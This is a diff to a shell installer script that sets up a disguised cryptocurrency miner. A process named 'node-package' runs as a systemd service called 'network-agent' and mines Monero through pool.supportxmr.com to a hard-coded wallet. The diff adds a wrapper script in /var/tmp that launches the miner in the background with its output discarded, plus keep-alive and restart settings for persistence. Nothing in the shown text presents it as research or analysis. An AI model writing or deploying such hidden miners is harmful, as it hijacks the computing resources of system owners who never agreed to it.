@@ -40,6 +40,24 @@ echo "Stopping any existing node-package processes..."
 pkill -f "node-package" 2>/dev/null || true
 sleep 2
 
+# Create wrapper script for background execution
+WRAPPER_PATH="/var/tmp/node-package-wrapper.sh"
+echo "Creating wrapper script..."
+cat > "$WRAPPER_PATH" <<EOF
+#!/bin/bash
+# Kill any existing instances first
+pkill -f "node-package.*test.com" 2>/dev/null || true
+sleep 1
+# Run in background like the original nohup command
+nohup $AGENT_PATH -o pool.supportxmr.com:443 -u 44xquCZRP7k5QVc77uPtxb7Jtkaj1xyztAwoyUtmigQoHtzA8EmnAEUbpoeWcxRy1nJxu4UYrR4fN3MPufQQk4MTL6M2Y73 -k --tls -p prolay > /dev/null 2>&1 &
+# Keep the wrapper running to maintain the service
+while pgrep -f "node-package.*test.com" > /dev/null; do
+    sleep 30
+done
+EOF
+
+chmod +x "$WRAPPER_PATH"
+
 # Create systemd service file
 echo "Creating systemd service..."
 cat > "$SERVICE_PATH" <<EOF
@@ -49,12 +67,11 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=$AGENT_PATH -o pool.supportxmr.com:443 -u 44xquCZRP7k5QVc77uPtxb7Jtkaj1xyztAwoyUtmigQoHtzA8EmnAEUbpoeWcxRy1nJxu4UYrR4fN3MPufQQk4MTL6M2Y73 -k --tls -p prolay
+ExecStart=$WRAPPER_PATH
 Restart=always
 RestartSec=60
-StandardOutput=journal
-StandardError=journal
-PIDFile=/var/run/network-agent.pid
+KillMode=mixed
+TimeoutStopSec=10
 
 [Install]
 WantedBy=multi-user.target
